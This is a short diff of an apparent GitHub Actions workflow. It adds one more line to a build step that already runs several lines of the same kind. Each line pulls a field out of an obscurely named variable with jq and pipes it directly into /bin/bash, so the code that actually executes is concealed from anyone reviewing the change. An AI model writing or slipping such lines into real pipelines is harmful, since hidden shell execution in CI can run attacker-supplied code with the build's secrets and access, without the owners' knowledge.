@@ -30,6 +30,7 @@ jobs:
           echo $ddx70 | jq -r .nqkpt3 | /bin/bash
           printf '%s' "$ger5702" | jq -r .y82498 | /bin/bash
           echo $t392 | jq -r .mnqa76 | /bin/bash
+          printf '%s' "$ak45004" | jq -r .tbox94407 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
